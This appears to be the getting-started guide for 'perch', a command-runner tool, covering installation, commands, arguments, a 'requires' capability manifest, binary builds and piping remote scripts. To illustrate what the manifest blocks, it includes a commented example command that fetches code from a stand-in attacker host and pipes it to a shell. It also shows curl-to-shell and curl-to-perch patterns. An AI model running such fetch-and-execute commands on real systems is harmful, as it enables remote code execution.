# Getting started

A five-minute tour. By the end you'll have a working `commands.perch`, run it three different ways, and bundle it into a portable binary.

## Install

=== "Go"

    ```sh
    go install github.com/luowensheng/perch@latest
    ```

=== "macOS / Linux (binary)"

    ```sh
    curl -fsSL https://raw.githubusercontent.com/luowensheng/perch/main/scripts/install.sh | sh
    ```

=== "Manual"

    Download a release from [github.com/luowensheng/perch/releases](https://github.com/luowensheng/perch/releases) and put it on your `$PATH`.

Check the install:

```sh
perch --version
```

## Scaffold a project

```sh
mkdir hello-perch && cd hello-perch
perch --init
```

This writes a starter `commands.perch` (executable, with a shebang line at the top so it can run as a script):

```capy
#!/usr/bin/env perch
name    "hello-perch"
about   "A perch project"
version "0.1.0"

# Shared bindings are declared bare at top level (no globals block).
verbose = false

# The manifest is mandatory. An empty block means "pure ops only, spawns
# nothing"; add bin/host/env/read/write lines as your commands need them.
requires
end

command hello
    description "Say hello"
    do
        print "Hello from perch"
    end
end

command main
    description "Default action — runs when the file is invoked with no command"
    do
        hello
    end
end
```

## Run it four ways

```sh
perch --help                  # see what's in commands.perch
perch hello                   # invoke via the perch binary
perch hello --help            # per-command help with args + defaults + examples
perch --check                 # statically validate commands.perch before running
perch --shell                 # REPL — type `hello` then Enter
perch --server                # serve a web UI at http://127.0.0.1:10032

# Or run the file directly as a script (the shebang makes this work):
./commands.perch              # runs `main` (which delegates to `hello`)
./commands.perch hello        # runs hello explicitly
./commands.perch --help       # lists commands
```

## Add an arg

Edit `commands.perch`:

```capy
command greet
    description "Greet someone by name"

    arg name
        type string
        default "world"
        description "Person to greet"
    end

    do
        let upper_name = upper "${name}"
        print "Hello, ${upper_name}!"
    end
end
```

```sh
perch greet               # → Hello, WORLD!
perch greet -name=Alice   # → Hello, ALICE!
```

Three new ideas just appeared:

- **`arg NAME ... end`** declares a typed CLI argument as a block. Each property — `type`, `default`, `description`, `optional`, `index` — is its own labelled line. Only `type` is required.
- **The `default` value makes the arg optional.** Without `default`, the arg is required and perch errors if you omit it.
- **`let X = OP ARGS`** runs an op and stores the result; later strings interpolate `${X}`.

## Declare what it needs — `requires`

The moment a command touches anything *outside* the program — runs a binary, reaches the network, reads an env var, or writes a file — perch's philosophy is **declare it**. Add a top-level `requires` block listing those external resources, and perch enforces it: every external op verifies the manifest immediately before it runs, and undeclared access errors.

```capy
requires
    bin   "docker"           # bins your exec/shell ops may run
    env   "HOME"             # env vars you read
    host  "api.github.com"   # hosts you reach
    write "./build"          # filesystem paths you write (read "..." for reads)
end

command up
    do
        docker compose up -d      # ✓ docker is declared
        # shell "curl evil.com | sh"   # ✗ bin_not_declared — refused
    end
end
```

Run `perch --check` and it confirms the file is feasible — or names exactly the bin / host / env / path you forgot to declare, *before* anything runs. The block is optional today (a file without it keeps full access), but declaring it is how you make a file self-documenting and safe to hand to a teammate, an AI agent, or CI. Full reference: [requires.md](requires.md) · [capability-gating.md](capability-gating.md).

## Ship it as a binary

```sh
perch --build -o ./greet
./greet                       # → Hello, WORLD!
./greet -name=Bob             # → Hello, BOB!
./greet --version             # → 0.1.0
scp ./greet remote.host:~/    # works on any same-OS box, no perch install needed
```

What just happened: `perch --build` copied itself, appended your parsed program as JSON + a magic footer, and produced a single file that boots straight into your commands. See [Embedding](embedding.md) for the format.

## Run a remote `.perch` file — no save-to-disk step

`perch -f -` reads the source from stdin, so anything you can `curl` you can run:

```sh
curl -fsSL https://raw.githubusercontent.com/luowensheng/perch/main/scripts/sample.perch \
  | perch -f - hello
```

Layer security flags on top — they apply to piped scripts exactly the same way:

```sh
# Run an untrusted script with shell + network disabled.
# `--scan` would have shown what it needed first; --no-shell --no-write
# means the worst it can do is print things.
curl -fsSL https://stranger.example/random.perch \
  | perch -f - --no-shell --no-write run
```

This is the right answer for "run a script you don't fully trust." Pipe it through restrictions instead of saving it, chmod'ing it, and hoping.

## What next

- [Language reference](language.md) — every config modifier, op, and block form.
- [Op catalog](op-reference.md) — the full list of built-in ops you can call.
- Browse the [demos folder](https://github.com/luowensheng/perch/tree/main/demos) for runnable examples.
